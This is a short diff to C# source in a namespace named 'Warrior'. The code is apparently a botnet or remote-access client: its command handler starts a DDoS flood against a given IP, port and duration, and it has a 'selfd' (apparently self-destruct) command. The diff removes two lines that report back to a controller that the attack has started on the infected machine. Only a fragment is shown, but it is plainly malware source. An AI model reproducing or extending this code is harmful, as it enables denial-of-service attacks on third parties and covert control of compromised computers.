@@ -589,8 +589,6 @@ namespace Warrior
                 var port = d[0];
                 var duration = d[1];
                 new Warrior.Dos().Startddos(ip, Convert.ToInt32(port), Convert.ToInt32(duration));
-                var data = Encoding.UTF8.GetBytes("commandR= DDos Has Started on client " + Environment.MachineName);
-                client.Send(data, data.Length);
             }
             else if (command == "selfd")
             {
@@ -665,3 +663,4 @@ namespace Warrior
 
     }
 }
+
